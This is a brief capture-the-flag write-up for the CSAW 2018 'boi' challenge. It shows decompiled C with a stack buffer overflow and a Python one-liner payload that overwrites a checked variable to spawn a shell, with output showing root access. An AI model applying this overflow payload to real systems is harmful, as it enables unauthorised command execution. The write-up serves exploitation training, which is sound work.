# CSAW 2018 boi

Looking at the decompilation, there's a clear buffer overflow. In order to get a shell, we simply have to overwrite a variable.

```c
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack36 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&local_38,0x18);
  if (iStack36 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
```

```bash
[root@pwn:~/code/nightmare/csaw18_boi]$ (python -c 'print "A" * 20 + "\xEE\xBA\xF3\xCA"'; cat -) | ./boi 
Are you a big boiiiii??
whoami
root
```